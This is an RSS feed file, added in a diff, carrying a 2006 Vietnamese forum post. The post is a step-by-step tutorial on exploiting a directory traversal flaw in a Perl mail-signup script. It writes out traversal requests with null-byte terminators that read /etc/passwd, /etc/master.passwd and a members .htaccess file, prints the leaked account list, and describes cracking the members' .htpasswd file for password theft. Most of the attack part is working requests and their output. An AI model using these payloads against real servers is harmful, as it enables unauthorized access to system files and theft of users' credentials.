@@ -1,0 +1,158 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Ví Dụ Minh Họa Exploit Lỗi Bảo Mật Directory Traversal "]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Ví Dụ Minh Họa Exploit Lỗi Bảo Mật Directory Traversal "]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Ví Dụ Minh Họa Exploit Lỗi Bảo Mật Directory Traversal </title>
+				<description><![CDATA[ Ghi chú dành cho newbie: Nhiều đoạn script chạy trên các server trên Internet không kiểm tra dữ liệu đầu vào một cách đúng đắn, tạo điều kiện cho hacker đưa vào những dữ liệu nhằm phục vụ cho ý đồ của họ. Directory Traversal là một trong những lỗi bảo mật đơn giản nhất thuộc dạng này. Chắc bạn đã biết trên Windows cũng như trên các hệ *nix, ký tự “..” là để chỉ thư mục “cha” của thư mục hiện hành. Ví dụ tôi đang ở trong thư mục D:\Perl\bin, thì dòng lệnh 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>D:\Perl\bin&gt;cd ..\..   ## trên Unix, lệnh tương ứng là cd ../..</pre>
+		</div>
+
+sẽ đưa tôi về thư mục gốc của ổ đĩa D. Lợi dụng nguyên tắc này, hacker có thể sẽ đọc được dữ liệu bên ngoài thư mục Web root trên server (dĩ nhiên đây là điều không tốt chút nào).
+
+Hôm nay tôi sẽ giới thiệu với các bạn cách exploit lỗi bảo mật Directory Traversal qua một ví dụ thật 100%. Số là tôi muốn hack vào một server nọ. Dĩ nhiên đây là server của một anh bạn tôi, anh ấy nhờ tôi kiểm tra giùm hệ thống bảo mật. Tôi chưa biết một chút thông tin nào về server của anh bạn tôi, ngoại trừ việc nó có dịch vụ Web. Ta hãy giả sử tên trang Web của nó là<span class="link"> http://myfriend.com</span> (tôi sẽ không nói tên trang Web thật cho bạn biết đâu ). Sử dụng một chương trình Web crawling, tôi dễ dàng nắm được cấu trúc website của anh ta, ngoại trừ khu vực dành riêng cho các thành viên có đăng ký (và có trả tiền):<span class="link"> http://myfriend.com/members/.</span> 
+
+Sau khi xem qua cấu trúc website của anh bạn, tôi chú ý tới một file:
+ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://myfriend.com/mailme/s.pl</pre>
+		</div>
+nghe nói đoạn script này (để đăng ký mail account mới) có lỗi Directory Traversal. Sau khi mày mò một lúc với các thông số của nó (tôi lược bỏ đoạn mày mò rắc rối và chán phèo này), tôi đã phát hiện ra thông số khả nghi (tiềm ẩn lỗi), đó là thông số “l=”.
+
+Tôi thử download source code của file này bằng cách 
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Request<span class="link"> http://myfriend.com/mailme/s.pl?e=1&subscribe=subscribe&l=../mailme/s.pl%00</span></pre>
+		</div>
+-> No luck!
+Tuy nhiên tôi thấy mình nhận được thông báo “That list does not exists.” Đây là dấu hiệu tốt, cho thấy tôi đã “inject” được chuỗi nhập của mình vào thông số “l” (list).
+
+Ghi chú cho newbie: Phải thêm %00 để kết thúc list, vì thông số mà tôi đang sử dụng là một danh sách.
+
+Không thèm download source code nữa, tôi sẽ thử download passfile /etc/passwd. 
+
+Ghi chú dành cho newbie: /etc/passwd là file chứa tất cả username và (có thể là) password đã mã hóa của mọi user trên một hệ thống *nix.
+
+Vì thư mục Web root thường được đặt tại /usr/home/[something]/somesite.com/ nên tôi biết rằng mình phải “nhảy ra” tối thiểu là 4 hoặc 5 cấp. Chẳng có cách nào khác ngoài thử:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Request<span class="link"> http://myfriend.com/mailme/s.pl?e=1&subscribe=subscribe&l=../../../../etc/passwd%00</span></pre>
+		</div>
+-> No luck!
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Request<span class="link"> http://myfriend.com/mailme/s.pl?e=1&subscribe=subscribe&l=../../../../../etc/passwd%00</span></pre>
+		</div>
+-> No luck!
+Tôi thử đến 8 cấp:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Request<span class="link"> http://myfriend.com/mailme/s.pl?e=1&subscribe=subscribe&l=../../../../../../../../etc/passwd%00</span></pre>
+		</div>
+-> BLAM!
+Thành công mỹ mãn! Đây là kết quả trả về:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>root:*:0:0:Charlie &:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+daemon:*:1:1:Owner of many system processes:/root:/sbin/nologin
+operator:*:2:5:System &:/:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source,,,:/:/sbin/nologin
+tty:*:4:65533:Tty Sandbox:/:/sbin/nologin
+kmem:*:5:65533:KMem Sandbox:/:/sbin/nologin
+games:*:7:13:Games pseudo-user:/usr/games:/sbin/nologin
+news:*:8:8:News Subsystem:/:/sbin/nologin
+man:*:9:9:Mister Man Pages:/usr/share/man:/sbin/nologin
+sshd:*:22:22:Secure Shell Daemon:/var/empty:/sbin/nologin
+smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/sbin/nologin
+mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/sbin/nologin
+bind:*:53:53:Bind Sandbox:/:/sbin/nologin
+uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/libexec/uucp/uucico
+xten:*:67:67:X-10 daemon:/usr/local/xten:/sbin/nologin
+pop:*:68:6:Post Office Owner:/nonexistent:/sbin/nologin
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/bin/sh
+admin:*:1001:1001:Admin:/usr/home/admin:/bin/sh
+mysql:*:88:88:MySQL Daemon:/var/db/mysql:/sbin/nologin
+myfriend:*:1000:100:myfriend:/usr/home/myfriend:/bin/sh
+mf-tgp:*:1000:100:myfriend:/usr/home/myfriend/public_html/myfriend.com/tgp:/sbin/nologin
+nightowl:*:1002:6:nightowl:/home/mail/nightowl:/bin/sh
+chloe:*:1003:100:chloe:/home/chloe:/sbin/nologin
+oliv:*:1003:100:chloe:/home/chloe:/sbin/nologin
+webmaster:*:1004:100:webmaster:/home/mail/webmaster:/sbin/nologin
+passhelp:*:1016:6:passhelp:/home/mail/passhelp:/sbin/nologin
+josie:*:1005:6:josie:/home/mail/josie:/sbin/nologin
+princess:*:1008:6:princess:/usr/home/mail/princess:/sbin/nologin
+easy66:*:1032:6:easy66:/usr/home/mail/easy66:/sbin/nologin</pre>
+		</div>
+Đó chính là nội dung file passwd! Tôi đã exploit thành công lỗi Directory Traversal. Nhưng hãy khoan, như bạn thấy trong file passwd không có password mã hóa của các user (đều được thay thế bằng ký tự “*”), chắc hẳn anh bạn tôi đã sử dụng file shadow. 
+
+Ghi chú cho newbie: Shadow là chị em song sinh với file passwd, người ta tách các password mã hóa ra khỏi file passwd và cất vào file shadow nhằm tăng cường khả năng bảo mật.
+
+OK, keep trying:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://myfriend.com/mailme/s.pl?e=1&subscribe=subscribe&l=../../../../../../../../etc/shadow%00</pre>
+		</div>
+-> “That list does not exists.” 
+
+Ha, bây giờ thế nào đây? Sao lại không có file shadow cà? Tôi đoán server của anh bạn tôi dùng một hệ điều hành khác Linux. Không thành vấn đề, sử dụng một chương trình “in dấu chân”, tôi biết HĐH của server là FreeBSD. (Sorry, không thể cho bạn biết tên chương trình là gì đâu, và xin lưu ý: in dấu chân hoặc scan server của người khác mà không được phép là phạm pháp!) Tôi chẳng biết quái gì về FreeBSD cả, ngoại trừ nó là một hệ *nix!!! Chưa biết thì phải học thôi, download một tutorial FreeBSD về <span class="link"> http://ftp.cgu.edu.tw/Mirror/E-Book/....eBook-EEn.pdf</span>) và bắt đầu đọc…
+
+Hehe, đây rồi: FreeBSD không có file shadow, password của nó được chứa trong file /etc/master.passwd. Thử liền:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://myfriend.com/mailme/s.pl?e=1&subscribe=subscribe&l=../../../../../../../../etc/master.passwd%00</pre>
+		</div>
+-> Empty reply (trống trơn chẳng có gì hết) Điều này có nghĩa là file /etc/master.passwd có tồn tại nhưng đoạn script này không trích xuất được nội dung của nó (có thể do không có quyền). Đọc kỹ lại tutorial xem sao?...
+
+Biết ngay mà! Chỉ những user có quyền root mới có thể đọc được file master.passwd. Và Web service ở đây rõ ràng là không có quyền này. 
+
+Có thể nói tôi đã thành công 50%. Tuy không thể lấy được password chứa trong file /etc/master.passwd nhưng tôi đã có trong tay tất cả các user hợp lệ của server (từ file /etc/passwd). Thông tin này sẽ giúp công việc của tôi dễ dàng hơn rất nhiều khi tấn công bằng brute force hoặc dictionary attack.
+
+Ghi chú dành cho newbie: Brute force là thử tất cả các tổ hợp password, dictionary attack là dùng từ điển (chứa rất nhiều password khác nhau) để thử. Dĩ nhiên bạn phải có chương trình giúp bạn tự động thực hiện điều đó, chứ không phải thử bằng tay.
+
+Chưa lấy được quyền root trên server nhưng tôi đã hoàn toàn làm chủ khu vực member của anh bạn tôi (bạn còn nhớ chứ, khu vực dành cho các khách hàng trả tiền ấy mà). Tôi có thể lấy được passfile của khu vực này (phân biệt với passfile của server nằm trong thư mục /etc/). Bằng cách nào? Bạn hãy trở lên xem lại nội dung file /etc/passwd, lưu ý dòng:
+
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>mf-tgp:*:1000:100:myfriend:/usr/home/myfriend/public_html/myfriend.com/tgp:/sbin/nologin</pre>
+		</div>
+Đây rõ ràng là account để vào cập nhật trang Web của anh bạn tôi, chúng ta thấy đường dẫn đến thư mục Web root: /usr/home/myfriend/public_html/myfriend.com/. K, bây giờ chỉ việc thêm vào members/.htaccess là chúng ta sẽ thấy cuộc đời rất đẹp 
+
+Ghi chú cho newbie:.htaccess là file cấu hình truy cập dành cho các thư mục có authenticate (phải có username, password mới vào được). Lý do tôi quan tâm đến nó là vì bên trong có đường dẫn tới passfile của khu vực member 
+
+
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://myfriend.com/mailme/s.pl?e=1&subscribe=subscribe&l=../../../../../../../../usr/home/myfriend/public_html/myfriend.com/members/.htaccess%00</pre>
+		</div>
+Kết quả:
+
+
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>RewriteOptions inherit AuthUserFile /usr/home/myfriend/public_html/myfriend.com/ccbill/password/.htpasswd AuthGroupFile /dev/null AuthName Members AuthType Basic require valid-user IndexIgnore * order allow,deny deny from 167.206.82.154 deny from 80.34.119.79 deny from 68.38.173 deny from 82.41.176.114 allow from all</pre>
+		</div>
+Blah blah blah…
+Nội dung file này rất dài nhưng thứ duy nhất mà tôi quan tâm nằm ngay trên đầu: /usr/home/myfriend/public_html/myfriend.com/ccbill/password/.htpasswd
+Đây chính là địa chỉ tuyệt đối của file .htpasswd, passfile của khu vực member. Nội dung file .htpasswd bao gồm toàn username và password đã mã hóa của các member trong trang web của anh bạn tôi. Một tay hacker xấu xa nào đó có thể làm y như tôi, lấy passfile này về, dùng một chương trình crack password (ví dụ như John The Ripper) và tùy theo định dạng, hắn có thể crack tất cả password của anh bạn tôi trong vòng vài giờ hoặc vài ngày. Sau đó hắn sẽ tung các password crack được lên các forum trao đổi pass “miễn phí”, gây lỗ lã và tạo ra vô số cơn đau đầu.
+
+
+(Nguồn : www.diendantinhoc.com- Old shark !?)
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/1090.hva#4556</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/1090.hva#4556</link>
+				<pubDate><![CDATA[Thu, 6 Jul 2006 13:22:58]]> GMT</pubDate>
+				<author><![CDATA[ hung1910]]></author>
+			</item>
+	</channel>
+</rss>
